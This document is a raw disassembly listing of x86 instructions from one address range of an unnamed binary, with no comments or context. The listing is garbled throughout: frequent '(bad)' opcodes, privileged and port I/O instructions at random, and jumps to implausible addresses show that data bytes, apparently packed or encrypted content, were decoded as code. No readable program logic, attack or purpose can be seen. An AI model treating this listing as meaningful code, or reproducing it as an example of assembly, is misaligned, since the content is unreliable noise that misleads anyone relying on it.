  407211:	rol    BYTE PTR [edx],cl
  407213:	fisubr DWORD PTR [ebx-0x12140e1e]
  407219:	mov    esp,0xee5a0997
  40721e:	(bad)  
  40721f:	push   0xffffffb3
  407221:	sbb    DWORD PTR [ecx+eax*8+0x56a2cc03],0x54
  407229:	xor    ax,0xea5e
  40722d:	sbb    eax,0x7319f45a
  407232:	pop    eax
  407233:	ret    
  407234:	or     BYTE PTR [edi+edi*8+0x68],al
  407238:	mov    bl,0x65
  40723a:	not    BYTE PTR [edx+0x91ce28d]
  407240:	(bad)  
  407241:	sub    al,0xea
  407243:	xlat   BYTE PTR ds:[ebx]
  407244:	popa   
  407245:	(bad)  
  407246:	jge    0x4071f8
  407248:	xchg   BYTE PTR [ebx-0x58],bh
  40724b:	cmp    BYTE PTR [esi-0x40],ah
  40724e:	jl     0x407272
  407250:	jecxz  0x4072b9
  407252:	je     0x407277
  407254:	fbld   TBYTE PTR [ebx+0x6cc6739f]
  40725a:	or     DWORD PTR [ebx+edi*1],esp
  40725d:	mov    ecx,es
  40725f:	push   es
  407260:	and    DWORD PTR [edi],esp
  407262:	push   ebp
  407263:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407264:	add    eax,0xe8280944
  407269:	jmp    0xe1f85659
  40726e:	imul   eax,DWORD PTR [eax],0x13da961c
  407274:	dec    esp
  407275:	(bad)  
  407276:	sar    ebp,1
  407278:	or     eax,DWORD PTR [esi+0x4761300]
  40727e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40727f:	jo     0x40725d
  407281:	mov    BYTE PTR [eax-0x6021ccd0],bh
  407287:	mov    bl,0x4c
  407289:	push   0xffffffb8
  40728b:	lods   al,BYTE PTR ds:[esi]
  40728c:	xor    al,0x37
  40728e:	es cdq 
  407290:	adc    edx,DWORD PTR [esp+eiz*2]
  407293:	jns    0x407246
  407295:	dec    esi
  407296:	js     0xfd61e68a
  40729c:	xchg   DWORD PTR [edx-0x568900a],esp
  4072a2:	push   cs
  4072a3:	mov    ebp,0xb46ad8b5
  4072a8:	or     cl,BYTE PTR [eax-0x5d]
  4072ab:	idiv   dh
  4072ad:	ret    
  4072ae:	sar    BYTE PTR [edx],cl
  4072b0:	pop    esi
  4072b1:	cmp    eax,0xc5fc8bfe
  4072b6:	jl     0x407251
  4072b8:	les    esi,FWORD PTR [edx]
  4072ba:	adc    dl,bh
  4072bc:	jnp    0x4072cb
  4072be:	sbb    al,BYTE PTR [ebp-0x7bc85da9]
  4072c4:	pop    ebx
  4072c5:	xor    BYTE PTR [esi+edx*4+0x1f],bh
  4072c9:	pop    ecx
  4072ca:	mov    al,0xb9
  4072cc:	retf   0xad6b
  4072cf:	jno    0x40730a
  4072d1:	xchg   ebx,eax
  4072d2:	test   BYTE PTR [edi+0x53],ch
  4072d5:	cmp    al,0x8
  4072d7:	call   0xe25e:0x7a1bfaf3
  4072de:	in     al,dx
  4072df:	adc    BYTE PTR [edi+0x3fd66770],dh
  4072e5:	xlat   BYTE PTR ds:[ebx]
  4072e6:	gs mov al,0x7d
  4072e9:	cmp    ebp,DWORD PTR [eax-0x57fa8321]
  4072ef:	int3   
  4072f0:	(bad)
  4072f5:	xchg   BYTE PTR [esi-0x68],bl
  4072f8:	xor    eax,0xd444728
  4072fd:	outs   dx,DWORD PTR ds:[esi]
  4072fe:	aaa    
  4072ff:	sub    DWORD PTR [ebx+0x1dee753],eax
  407305:	or     eax,0xcce54b01
  40730a:	mov    al,0xbf
  40730c:	sub    bl,BYTE PTR [eax-0x60b252e]
  407312:	xor    eax,0xaba0cf86
  407317:	push   edx
  407318:	sub    dl,BYTE PTR [esi]
  40731a:	or     DWORD PTR [ecx-0x69],ecx
  40731d:	sbb    ebp,DWORD PTR [edi-0x1bc661b]
  407323:	inc    esi
  407324:	ret    
  407325:	(bad)  
  407326:	and    DWORD PTR [eax],eax
  407328:	inc    eax
  407329:	ss push cs
  40732b:	mov    cl,0xf2
  40732d:	sar    bl,0xf7
  407330:	test   eax,0xa416f146
  407335:	(bad)  
  407336:	int3   
  407337:	xchg   ecx,esp
  407339:	iret   
  40733a:	icebp  
  40733b:	jmp    0xa0320eb1
  407340:	cld    
  407341:	loope  0x40733b
  407343:	jge    0x4073a7
  407345:	add    bl,BYTE PTR ds:0xcce3a40f
  40734b:	hlt    
  40734c:	stc    
  40734d:	adc    DWORD PTR [ebp+0x2eca17af],esi
  407353:	dec    eax
  407354:	mov    eax,ds:0x29a14fd7
  407359:	outs   dx,DWORD PTR ds:[esi]
  40735a:	sub    cl,BYTE PTR [esi+0x7ec6e8b7]
  407360:	call   0x5b2e1672
  407365:	adc    al,0x10
  407367:	push   ebp
  407368:	rcr    ah,1
  40736a:	jne    0x40733f
  40736c:	pop    ebx
  40736d:	cmp    al,0xf1
  40736f:	adc    DWORD PTR [edx-0x38ef2fc3],0xb12c968a
  407379:	sar    BYTE PTR [esi+0x40],1
  40737c:	sti    
  40737d:	jg     0x407339
  40737f:	xor    DWORD PTR [ecx+ebx*8],esi
  407382:	push   0xc3978aa4
  407387:	lods   al,BYTE PTR ds:[esi]
  407388:	cwde   
  407389:	(bad)  
  40738b:	xor    bl,ch
  40738d:	add    al,0x41
  40738f:	popa   
  407390:	jp     0x407326
  407392:	cmp    eax,0x8d8726dc
  407397:	and    al,0x22
  407399:	mov    ebx,0xea9bcf9e
  40739e:	ins    BYTE PTR es:[edi],dx
  40739f:	icebp  
  4073a0:	jns    0x40737c
  4073a2:	call   0xbd417c07
  4073a7:	mov    ds:0x837af731,al
  4073ac:	fmul   DWORD PTR ds:0x6a0bcfa1
  4073b2:	xchg   edx,eax
  4073b3:	sbb    BYTE PTR [ebx],al
  4073b5:	pop    ds
  4073b6:	adc    bl,ah
  4073b8:	sub    BYTE PTR [eax-0x44],ch
  4073bb:	imul   esp,DWORD PTR [esi],0x8246fe7e
  4073c1:	xchg   esi,eax
  4073c2:	adc    cx,cx
  4073c5:	in     al,0x49
  4073c7:	cdq    
  4073c8:	cdq    
  4073c9:	outs   dx,DWORD PTR ds:[esi]
  4073ca:	(bad)  
  4073cc:	movq   QWORD PTR [eax+ebx*1-0xf],mm2
  4073d1:	xchg   ebx,eax
  4073d2:	clc    
  4073d3:	jb     0x40736b
  4073d5:	mov    ah,0x39
  4073d7:	cli    
  4073d8:	jb     0x407438
  4073da:	aam    0xd
  4073dc:	or     BYTE PTR [edi],ch
  4073de:	sub    esi,edi
  4073e0:	test   eax,0xa0c5433b
  4073e5:	call   0xbb3af491
  4073ea:	dec    ecx
  4073eb:	data16 ss cmp cl,dh
  4073ef:	sbb    DWORD PTR cs:[edx+0x4daddf71],esi
  4073f6:	ds dec ebx
  4073f8:	and    dh,BYTE PTR [ecx+0x7c]
  4073fb:	iret   
  4073fc:	cdq    
  4073fd:	mov    ah,BYTE PTR [edx+0x15]
  407400:	test   DWORD PTR [esi+0x4b],ebx
  407403:	cmp    esp,edx
  407405:	ror    BYTE PTR [eax+ebp*1],cl
  407408:	sahf   
  407409:	in     al,0xe3
  40740b:	popf   
  40740c:	push   edx
  40740d:	lock out 0xb0,eax
  407410:	push   esp
  407411:	lds    esi,FWORD PTR [esi-0x2f]
  407414:	js     0x40739c
  407416:	(bad)  
  407417:	mov    ds:0xd593c049,al
  40741c:	dec    ebp
  40741d:	cld    
  40741e:	lods   eax,DWORD PTR ds:[esi]
  40741f:	outs   dx,BYTE PTR ds:[esi]
  407420:	cmp    edi,0xbb51a39a
  407426:	aad    0xfa
  407428:	xchg   ebp,eax
  407429:	lahf   
  40742a:	dec    eax
  40742b:	pop    esi
  40742c:	shl    DWORD PTR [edx+0x1],cl
  40742f:	test   ebx,0xefb401c1
  407435:	dec    ebx
  407436:	mov    esi,0x9d433260
  40743b:	push   eax
  40743c:	jl     0x407410
  40743e:	sar    BYTE PTR [ecx+0xd],cl
  407441:	in     al,dx
  407442:	out    0x5f,al
  407444:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407445:	std    
  407446:	xchg   edi,eax
  407447:	dec    ecx
  407448:	mov    ds:0xcc59cc1a,al
  40744d:	push   edx
  40744e:	mov    cl,0x54
  407450:	xor    eax,0xe536e814
  407455:	mov    eax,0xef614be7
  40745a:	cli    
  40745b:	push   es
  40745c:	push   edi
  40745d:	and    BYTE PTR [eax+0x70],cl
  407460:	bound  edi,QWORD PTR [ecx+0x35]
  407463:	jnp    0x4074b5
  407465:	pop    edi
  407466:	std    
  407467:	es sub al,0x8f
  40746a:	jns    0x4074a6
  40746c:	mov    esi,0x58f165ab
  407471:	sar    esi,0x20
  407474:	push   0x2f
  407476:	push   esi
  407477:	xchg   ecx,eax
  407478:	imul   ebx,DWORD PTR [ebx-0x4b],0xfea5dec9
  40747f:	lahf   
  407480:	fistp  QWORD PTR [ecx+0x3963fe71]
  407486:	ins    DWORD PTR es:[edi],dx
  407487:	cs xor eax,0x770b2a5d
  40748d:	pop    ebx
  40748e:	xchg   edx,eax
  40748f:	pop    esi
  407490:	dec    esp
  407491:	mov    BYTE PTR [edx+0x43877e38],0x69
  407498:	cmp    DWORD PTR [edi+0x5c],edi
  40749b:	xor    al,BYTE PTR [ebx-0x1d9c08b4]
  4074a1:	sbb    dl,BYTE PTR [esp+edx*8+0x1d]
  4074a5:	dec    esp
  4074a6:	mov    DWORD PTR [edx],esi
  4074a8:	fcomip st,st(6)
  4074aa:	fistp  DWORD PTR [eax]
  4074ac:	and    esi,DWORD PTR [eax]
  4074ae:	push   0xffffff8e
  4074b0:	ins    BYTE PTR es:[edi],dx
  4074b1:	fsub   QWORD PTR [ebx+0xb]
  4074b4:	adc    DWORD PTR [edx],ebx
  4074b6:	inc    edi
  4074b7:	cmp    esi,DWORD PTR [esi+ecx*1]
  4074ba:	dec    edi
  4074bb:	fs in  eax,dx
  4074bd:	mov    bh,0xbc
  4074bf:	cld    
  4074c0:	and    al,0xb
  4074c2:	dec    esp
  4074c3:	ja     0x40751e
  4074c5:	scas   eax,DWORD PTR es:[edi]
  4074c6:	mov    al,ds:0x4d72e2d6
  4074cb:	adc    BYTE PTR [eax-0x956337a],dl
  4074d1:	scas   eax,DWORD PTR es:[edi]
  4074d2:	mov    ecx,DWORD PTR [edi]
  4074d4:	fst    QWORD PTR [ecx-0x6f0a199f]
  4074da:	lds    ebp,FWORD PTR ss:[ebx]
  4074dd:	xor    eax,0x306e2fe2
  4074e2:	push   ecx
  4074e3:	push   ebx
  4074e4:	ret    
  4074e5:	stos   DWORD PTR es:[edi],eax
  4074e6:	push   ecx
  4074e7:	retf   0x89ab
  4074ea:	push   esi
  4074eb:	test   al,0xe6
  4074ed:	je     0x407558
  4074ef:	aaa    
  4074f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4074f1:	inc    DWORD PTR [eax]
  4074f3:	jae    0x40749c
  4074f5:	push   ebp
  4074f6:	das    
  4074f7:	int    0x4b
  4074f9:	push   ebx
  4074fa:	dec    edi
  4074fb:	mov    ebp,0xf8c887fb
  407500:	les    esp,FWORD PTR [eax-0x3e28338a]
  407506:	mov    BYTE PTR [esi],dl
  407508:	sbb    bl,BYTE PTR ds:[edi-0x12]
  40750c:	sbb    BYTE PTR [ebx],0x79
  40750f:	sbb    eax,0x342c76de
  407514:	in     eax,0xc0
  407516:	cwde   
  407517:	(bad)  
  407518:	loop   0x4074a6
  40751a:	xor    al,0x91
  40751c:	lahf   
  40751d:	lea    ecx,ds:0xa41fc6ef
  407523:	pop    ebx
  407524:	rcr    bl,0x8b
  407527:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407528:	test   eax,0xa086e4e0
  40752d:	sbb    eax,0xc0f7c775
  407532:	inc    eax
  407533:	(bad)  
  407535:	mov    cl,0x77
  407537:	fld    st(0)
  407539:	xor    BYTE PTR [edx+edi*8-0x8358c2d],al
  407540:	rcr    BYTE PTR [edx],0x7b
  407543:	ss dec ebp
  407545:	enter  0xf82f,0x12
  407549:	jle    0x40754e
  40754b:	in     eax,0xfc
  40754d:	xchg   esp,eax
  40754e:	add    DWORD PTR [ebp-0x43f6d4e4],0x7355f0d5
  407558:	pop    eax
  407559:	ret    0x3e09
  40755c:	pop    esp
  40755d:	inc    DWORD PTR [ebx+0x52205126]
  407563:	push   esi
  407564:	mov    al,ds:0x9ade34d5
  407569:	pop    esp
  40756a:	ja     0x4075d2
  40756c:	and    DWORD PTR [ebp-0x5f],ecx
  40756f:	xchg   edx,eax
  407570:	cmp    dl,dh
  407572:	cwde   
  407573:	data16 xor BYTE PTR [esi-0x5862d6e1],ch
  40757a:	test   eax,0x3121eedc
  40757f:	std    
  407580:	pop    ebp
  407581:	pop    ds
  407582:	pop    ebx
  407583:	add    BYTE PTR [eax+0x4a],ah
  407586:	mov    esi,ss
  407588:	lahf   
  407589:	shr    ebx,1
  40758b:	retf   
  40758c:	or     edi,DWORD PTR [esp+esi*2-0x724d45cf]
  407593:	rcr    ah,cl
  407595:	lds    edx,FWORD PTR [edi+0x59656cc5]
  40759b:	cmp    DWORD PTR [esi],ecx
  40759d:	and    DWORD PTR [ebp-0x25],ecx
  4075a0:	iret   
  4075a1:	xchg   ebx,eax
  4075a2:	test   DWORD PTR [eax+0x2f1ef343],esp
  4075a8:	lods   eax,DWORD PTR ds:[esi]
  4075a9:	xchg   esp,eax
  4075aa:	in     al,dx
  4075ab:	enter  0x22e2,0x89
  4075af:	(bad)  
  4075b0:	sbb    eax,DWORD PTR [eax]
  4075b2:	sub    cl,BYTE PTR [edi]
  4075b4:	pop    ecx
  4075b5:	sbb    eax,0x5fa48d9d
  4075ba:	sbb    eax,0xb2d99757
  4075bf:	mov    ss,ecx
  4075c1:	pop    edi
  4075c2:	push   esp
  4075c3:	xchg   edi,eax
  4075c4:	jg     0x4075ce
  4075c6:	pop    edx
  4075c7:	nop
  4075c8:	mov    ch,0xe1
  4075ca:	and    eax,ecx
  4075cc:	and    edi,DWORD PTR fs:[edi+0x21e96b7d]
  4075d3:	push   edx
  4075d4:	add    eax,0x532e1155
  4075d9:	mov    al,ds:0xabc6c138
  4075de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4075df:	add    BYTE PTR [edi+0x658cca6a],al
  4075e5:	and    al,0xea
  4075e7:	xor    edi,DWORD PTR ds:0xaf27515a
  4075ed:	sbb    ebp,DWORD PTR [ebx]
  4075ef:	mov    ah,0x97
  4075f1:	xor    dh,BYTE PTR [esi+0xd]
  4075f4:	xchg   ecx,eax
  4075f5:	jl     0x4075b0
  4075f7:	es jmp 0x407654
  4075fa:	xor    DWORD PTR [eax-0x682c35d2],edi
  407600:	in     eax,dx
  407601:	ficomp DWORD PTR [edi-0x25]
  407604:	cwde   
  407605:	jge    0x40758f
  407607:	sub    edx,0x15e404f
  40760d:	ja     0x4075f3
  40760f:	sub    al,0x1
  407611:	in     eax,dx
  407612:	or     ebx,DWORD PTR es:[eax]
  407615:	add    dh,BYTE PTR [eax-0x74d446f5]
  40761b:	(bad)  
  40761c:	test   al,0x17
  40761e:	and    BYTE PTR [ebx+esi*4-0x17b3683c],dl
  407625:	push   esp
  407626:	popa   
  407627:	scas   eax,DWORD PTR es:[edi]
  407628:	je     0x40765e
  40762a:	xor    eax,0x1299967b
  40762f:	push   ebx
  407630:	mov    eax,0x9f85b222
  407635:	sti    
  407636:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407637:	sbb    al,0x86
  407639:	jmp    0x407683
  40763b:	xchg   ebp,eax
  40763c:	jp     0x407649
  40763e:	fisttp WORD PTR [ecx+0x2a05a089]
  407644:	arpl   WORD PTR [edx-0x40e59c8d],sp
  40764a:	mov    ecx,0xc0c542cd
  40764f:	ins    DWORD PTR es:[edi],dx
  407650:	test   al,0x61
  407652:	iret   
  407653:	pusha  
  407654:	xchg   DWORD PTR [edi+0x61],eax
  407657:	xor    edi,DWORD PTR [ebx]
  407659:	inc    eax
  40765a:	aam    0xcc
  40765c:	(bad)  
  40765d:	jge    0x40767b
  40765f:	frstor [eax+0x46f6d227]
  407665:	sbb    DWORD PTR ds:0xf53aaea6,edi
  40766b:	call   0x18a9:0xa356570d
  407672:	repz sbb al,BYTE PTR [ebx+0x4e]
  407676:	add    esi,esi
  407678:	popa   
  407679:	xor    esi,DWORD PTR [eax+eax*8+0x573959c8]
  407680:	pop    edi
  407681:	daa    
  407682:	sbb    BYTE PTR [edi],dl
  407684:	dec    ebp
  407685:	das    
  407686:	out    dx,al
  407687:	ja     0x407636
  407689:	cdq    
  40768a:	(bad)  
  40768c:	mov    edi,0x88491e1e
  407691:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407692:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407693:	adc    eax,0x54882f4b
  407698:	or     BYTE PTR [esi],dl
  40769a:	popa   
  40769b:	or     cl,BYTE PTR [edx-0x6e06159e]
  4076a1:	push   edx
  4076a2:	out    dx,al
  4076a3:	xchg   ebx,eax
  4076a4:	jae    0x4076c0
  4076a6:	rol    DWORD PTR [ebx],cl
  4076a8:	dec    ebx
  4076a9:	mov    al,dl
  4076ab:	sub    dh,al
  4076ad:	in     eax,0xac
  4076af:	outs   dx,DWORD PTR gs:[esi]
  4076b1:	xor    al,0xcf
  4076b3:	mov    cl,0x40
  4076b5:	xchg   ebp,eax
  4076b6:	push   ds
  4076b7:	fadd   QWORD PTR [edx+0x7b]
  4076ba:	jl     0x407691
  4076bc:	(bad)  
  4076be:	jae    0x40771b
  4076c0:	div    DWORD PTR [ecx-0x15205694]
  4076c6:	dec    ecx
  4076c7:	or     eax,DWORD PTR [ebp+0x2f96d0c7]
  4076cd:	and    DWORD PTR [edi],edx
  4076cf:	mov    eax,0x5a6a4efe
  4076d4:	stc    
  4076d5:	test   eax,0xf5a287c9
  4076da:	sar    BYTE PTR [ebx+0x1f],1
  4076dd:	sti    
  4076de:	pusha  
  4076df:	sbb    esi,eax
  4076e1:	jmp    0x6454ce46
  4076e6:	rcr    DWORD PTR [ebx+0x4558bc62],1
  4076ec:	int3   
  4076ed:	push   cs
  4076ee:	push   esi
  4076ef:	loope  0x4076f2
  4076f1:	nop
  4076f2:	cmp    BYTE PTR [eax],cl
  4076f4:	jbe    0x40772a
  4076f6:	add    BYTE PTR [ebp+0x4483f7e8],dh
  4076fc:	push   edx
  4076fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4076fe:	call   0x44b0:0xa54d89a9
  407705:	push   ss
  407706:	sub    ch,BYTE PTR [ecx-0x3f]
  407709:	jo     0x407694
  40770b:	mov    BYTE PTR [esi],dh
  40770d:	fdivr  DWORD PTR [ecx]
  40770f:	and    eax,0xa638d06
  407714:	stc    
  407715:	push   ebp
  407716:	repz arpl cx,ax
  407719:	test   eax,0x44d39743
  40771e:	cmp    eax,0x2deb8c0d
  407723:	mov    edi,fs
  407725:	mov    ebx,0x1b067899
  40772a:	pop    ebp
  40772b:	scas   al,BYTE PTR es:[edi]
  40772c:	mov    ebx,0xedd6239a
  407731:	daa    
  407732:	xor    BYTE PTR [esi+0x5b28817b],al
  407738:	jne    0x40776f
  40773a:	adc    edi,DWORD PTR [ecx+0x7]
  40773d:	icebp  
  40773e:	pop    edx
  40773f:	sub    DWORD PTR [edx+0x7cf7d735],eax
  407745:	ret    
  407746:	aam    0x8c
  407748:	mov    edi,0x646340e8
  40774d:	scas   eax,DWORD PTR es:[edi]
  40774e:	xchg   ebx,eax
  40774f:	and    cl,BYTE PTR [edx+ecx*1+0x21717b0c]
  407756:	mov    eax,edi
  407758:	rol    DWORD PTR [eax-0x18437124],cl
  40775e:	push   ss
  40775f:	jp     0x4076fb
  407761:	mov    esi,0xebd0888
  407766:	dec    ebp
  407767:	or     dl,cl
  407769:	mov    edi,0x5c2060fc
  40776e:	push   ebx
  40776f:	cli    
  407770:	xchg   ebp,eax
  407771:	sub    DWORD PTR [ecx],esp
  407773:	fst    QWORD PTR [ecx+edi*1+0x7c]
  407777:	popf   
  407778:	es jae 0x40771d
  40777b:	shl    DWORD PTR [ebp-0x29d77e2c],cl
  407781:	out    0x24,al
  407783:	(bad)  
  407784:	mov    esp,0x1b60e05f
  407789:	inc    ecx
  40778a:	xchg   ebp,eax
  40778b:	adc    DWORD PTR [ebx-0x316e26d0],0x1f3daa01
  407795:	xlat   BYTE PTR ds:[ebx]
  407796:	mov    edx,0xa3329ec1
  40779b:	cmp    BYTE PTR [eax+0x4438c53f],cl
  4077a1:	out    0xd0,al
  4077a3:	add    BYTE PTR [ecx+0x25],bl
  4077a6:	aaa    
  4077a7:	cdq    
  4077a8:	jmp    0x407738
  4077aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4077ab:	sbb    cl,BYTE PTR [ecx-0x50]
  4077ae:	sub    BYTE PTR [esi-0x1c],dl
  4077b1:	adc    al,0x3a
  4077b3:	outs   dx,BYTE PTR ds:[esi]
  4077b4:	retf   0x3f07
  4077b7:	stc    
  4077b8:	fwait
  4077b9:	jp     0x407778
  4077bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4077bc:	fbld   TBYTE PTR [edi-0x55]
  4077bf:	cdq    
  4077c0:	iret   
  4077c1:	adc    DWORD PTR [ebx-0x1e],ebp
  4077c4:	pavgw  mm2,QWORD PTR [edi+0x427d18fd]
  4077cb:	retf   0x9c4f
  4077ce:	or     al,BYTE PTR [ecx-0x7936dce4]
  4077d4:	imul   ecx,DWORD PTR [edx],0x6d
  4077d7:	mov    edi,0x7aa7bd3f
  4077dc:	sbb    edx,esi
  4077de:	ret    
  4077df:	clc    
  4077e0:	push   esp
  4077e1:	popa   
  4077e2:	pop    edi
  4077e3:	pop    ecx
  4077e4:	cli    
  4077e5:	push   ss
  4077e6:	mov    esi,0xbdc4d37b
  4077eb:	jle    0x407788
  4077ed:	fild   QWORD PTR [esi+0x7c19ed5f]
  4077f3:	popf   
  4077f4:	mov    eax,DWORD PTR [esi]
  4077f6:	mov    esp,0xb345d126
  4077fb:	jge    0x4077bd
  4077fd:	pop    ecx
  4077fe:	pop    esi
  4077ff:	aas    
  407800:	enter  0x2dd,0x64
  407804:	div    BYTE PTR [ebx+edx*4-0x12b9f0e9]
  40780b:	push   0x35
  40780d:	mov    dl,BYTE PTR ds:0xacdb1813
  407813:	cld    
  407814:	shr    al,1
  407816:	mov    dl,0x8c
  407818:	stos   BYTE PTR es:[edi],al
  407819:	icebp  
  40781a:	scas   eax,DWORD PTR es:[edi]
  40781b:	push   eax
  40781c:	lds    esp,FWORD PTR [eax+0x6f]
  40781f:	cli    
  407820:	add    eax,0x665e2402
  407825:	dec    ebp
  407826:	setne  BYTE PTR [edx+ecx*2]
  40782a:	jmp    0x750722b4
  40782f:	sbb    al,cl
  407831:	inc    ebp
  407832:	out    dx,eax
  407833:	into   
  407834:	xchg   ah,dl
  407836:	test   BYTE PTR ds:0x76a22f5f,dh
  40783c:	js     0x4078ab
  40783e:	sbb    esp,DWORD PTR [ebx]
  407840:	pop    esi
  407841:	adc    BYTE PTR [ebx],dh
  407843:	(bad)  
  407844:	fsubr  st,st(3)
  407846:	xor    al,0x92
  407848:	mov    esi,0xfe5721dd
  40784d:	sti    
  40784e:	push   cs
  40784f:	lea    ebx,[ecx-0x2afd9add]
  407855:	(bad)  [edx]
  407857:	adc    DWORD PTR [edx+0x74e3841],ebp
  40785d:	lods   eax,DWORD PTR ds:[esi]
  40785e:	dec    edi
  40785f:	dec    edx
  407860:	loope  0x4078b6
  407862:	push   ebp
  407863:	test   DWORD PTR [eax],0x60fa4aa8
  407869:	dec    edi
  40786a:	imul   ecx,DWORD PTR [esi-0x61],0x45
  40786e:	dec    ebx
  40786f:	aad    0x9a
  407871:	fisttp DWORD PTR [ebx]
  407873:	jns    0x407838
  407875:	in     eax,0x90
  407877:	or     edx,DWORD PTR [edx]
  407879:	sti    
  40787a:	jp     0x40789f
  40787c:	mov    ebp,0xe4b3fbe0
  407881:	cmc    
  407882:	hlt    
  407883:	mov    cl,al
  407885:	add    cl,dh
  407887:	push   cs
  407888:	dec    esp
  407889:	jl     0x4078b4
  40788b:	int3   
  40788c:	rol    DWORD PTR [edi],0xc
  40788f:	(bad)  
  407890:	jb     0x4078d0
  407892:	xchg   DWORD PTR [ebx],ecx
  407894:	mov    eax,0xfa1af517
  407899:	imul   ebp,DWORD PTR cs:[ecx+0x0],0x12
  40789e:	cmp    esp,ebp
  4078a0:	pusha  
  4078a1:	mov    ah,0x81
  4078a3:	mov    dh,0x63
  4078a5:	lods   eax,DWORD PTR ds:[esi]
  4078a6:	jle    0x407834
  4078a8:	add    BYTE PTR [edx],dl
  4078aa:	in     al,0x69
  4078ac:	pusha  
  4078ad:	jle    0x407925
  4078af:	(bad)  
  4078b0:	fidiv  WORD PTR [eax]
  4078b2:	outs   dx,BYTE PTR ds:[esi]
  4078b3:	loopne 0x407905
  4078b5:	push   edi
  4078b6:	sbb    eax,DWORD PTR cs:[esp+ebp*2-0x478b1f83]
  4078be:	dec    esi
  4078bf:	loope  0x407915
  4078c1:	xor    al,BYTE PTR [esp+ecx*1]
  4078c4:	cld    
  4078c5:	call   FWORD PTR [eax+0x620412b8]
  4078cb:	aas    
  4078cc:	fnop   
  4078ce:	xor    al,0x89
  4078d0:	mov    ch,0x19
  4078d2:	pusha  
  4078d3:	sub    ch,BYTE PTR [ebp+0x2c14f443]
  4078d9:	mov    esp,0x4505195
  4078de:	mov    esi,0xeb9f3c1e
  4078e3:	jge    0x407913
  4078e5:	mov    bh,0x3
  4078e7:	adc    DWORD PTR [ecx+0x479cd08f],esi
  4078ed:	sahf   
  4078ee:	retf   
  4078ef:	push   es
  4078f0:	mov    ebp,0xedc380ba
  4078f5:	inc    eax
  4078f6:	ins    BYTE PTR es:[edi],dx
  4078f7:	inc    esi
  4078f8:	loopne 0x407942
  4078fa:	adc    ebx,DWORD PTR [edx+0x5e]
  4078fd:	jmp    0x4078d8
  4078ff:	imul   esi,ebx,0xd07874d6
  407905:	cmc    
  407906:	xlat   BYTE PTR ds:[ebx]
  407907:	imul   DWORD PTR [ecx+0x69]
  40790a:	out    dx,al
  40790b:	rol    DWORD PTR [edx-0x5cf70094],0xef
  407912:	out    dx,eax
  407913:	push   ss
  407914:	in     al,dx
  407915:	push   ebp
  407916:	int3   
  407917:	int3   
  407918:	loopne 0x4078a6
  40791a:	jne    0x4078e0
  40791c:	xor    al,0x44
  40791e:	jnp    0x407921
  407920:	jmp    0xe2c6:0xd88970a6
  407927:	mov    al,0x30
  407929:	test   bh,ah
  40792b:	(bad)  [esp+ebp*2]
  40792e:	pop    es
  40792f:	mov    gs,WORD PTR [ebp+0x44ddbebc]
  407935:	add    ebp,eax
  407937:	(bad)  
  407938:	outs   dx,DWORD PTR ds:[esi]
  407939:	or     al,0xf0
  40793b:	clc    
  40793c:	dec    ebp
  40793d:	pop    ebp
  40793e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40793f:	xchg   esp,eax
  407940:	lds    edx,FWORD PTR [edx+0x3b]
  407943:	push   eax
  407944:	mov    ecx,0x74f461c1
  407949:	adc    DWORD PTR [edi],eax
  40794b:	ds jmp 0xe0055fd0
  407951:	mov    bl,0x8f
  407953:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407954:	int    0xd2
  407956:	test   eax,0x400bffe7
  40795b:	pop    ebp
  40795c:	push   ebx
  40795d:	gs ret 
  40795f:	pop    ebp
  407960:	inc    ecx
  407961:	fwait
  407962:	mov    esp,0xf4ceec52
  407967:	mov    ah,0xb1
  407969:	les    edi,FWORD PTR [ebx]
  40796b:	push   ebp
  40796c:	mov    ecx,0x8c5d27c0
  407971:	mov    ecx,0x2f083860
  407976:	xor    al,cl
  407978:	pop    ebx
  407979:	cmp    bl,dl
  40797b:	and    BYTE PTR [ebx-0x41a63ae8],bl
  407981:	sbb    BYTE PTR [ecx+0x4a],cl
  407984:	push   cs
  407985:	dec    ebp
  407986:	es dec esi
  407988:	cld    
  407989:	xor    BYTE PTR [ebx+eiz*8-0x339e5c8b],cl
  407990:	xor    BYTE PTR [edx+0x59c8f4d1],0x87
  407997:	jno    0x407966
  407999:	js     0x4079a4
  40799b:	push   edx
  40799c:	jmp    0xeda10dd5
  4079a1:	popf   
  4079a2:	push   edx
  4079a3:	cwde   
  4079a4:	lea    edi,ds:0xcc171a9a
  4079aa:	add    al,ch
  4079ac:	hlt    
  4079ad:	mov    ah,0x80
  4079af:	ins    DWORD PTR es:[edi],dx
  4079b0:	inc    edx
  4079b1:	ins    BYTE PTR es:[edi],dx
  4079b2:	cmp    eax,0xccc068bd
  4079b7:	dec    ebp
  4079b8:	mov    eax,ds:0x91ed5be0
  4079bd:	(bad)  
  4079be:	mov    BYTE PTR [esi+0x25],0x4a
  4079c2:	clc    
  4079c3:	jge    0x4079f3
  4079c5:	add    DWORD PTR [ebp-0x17682139],ebx
  4079cb:	sbb    DWORD PTR [eax+edi*4-0x62],ebx
  4079cf:	clc    
  4079d0:	(bad)  
  4079d1:	icebp  
  4079d2:	bound  eax,QWORD PTR [edx+0x6caa83c2]
  4079d8:	rcr    DWORD PTR [esi],1
  4079da:	mov    edi,0x2e9f9189
  4079df:	sbb    WORD PTR [eax],cx
  4079e2:	(bad)
  4079e5:	pusha  
  4079e6:	mov    ebx,0x45ec3a5c
  4079eb:	out    dx,eax
  4079ec:	mov    si,0xcbc5
  4079f0:	loope  0x407a38
  4079f2:	mov    ebp,0x1522da59
  4079f7:	iret   
  4079f8:	pop    ss
  4079f9:	cmp    eax,0x91b59ea1
  4079fe:	xor    eax,0xdda8f686
  407a03:	push   cs
  407a04:	lea    ebp,[eax]
  407a06:	xchg   edx,eax
  407a07:	and    bl,BYTE PTR [edi]
